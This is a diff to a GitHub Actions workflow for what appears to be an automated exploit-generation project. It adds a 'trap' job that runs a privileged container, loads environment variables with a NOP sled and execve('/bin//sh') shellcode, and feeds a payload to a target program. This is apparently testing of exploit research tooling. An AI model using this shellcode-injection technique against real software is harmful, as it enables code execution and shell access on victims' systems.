@@ -46,4 +46,26 @@ jobs:
           done &&
           july $(cat /app/payload)'
 
-          
+  trap:
+    runs-on: ubuntu-latest
+    if: github.event_name == 'workflow_dispatch'
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - run: 
+          docker pull myrtopar/autoexploit:latest
+
+      - run: |
+          docker run --rm --privileged \
+          -v ${{ github.workspace }}/src:/app/src \
+          -v ${{ github.workspace }}/crash_inputs:/app/crash_inputs \
+          -v ${{ github.workspace }}/payload:/app/payload \
+          -e PYTHONPATH=/app/src \
+          myrtopar/autoexploit:latest \
+          bash -c '
+          for i in {1..14}; do
+            export VAR$i=$(python3 -c "import sys; sys.stdout.buffer.write(b\"\x90\" * 131000 + b\"\xcc\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\")")
+          done &&
+          july $(cat /app/payload)'        
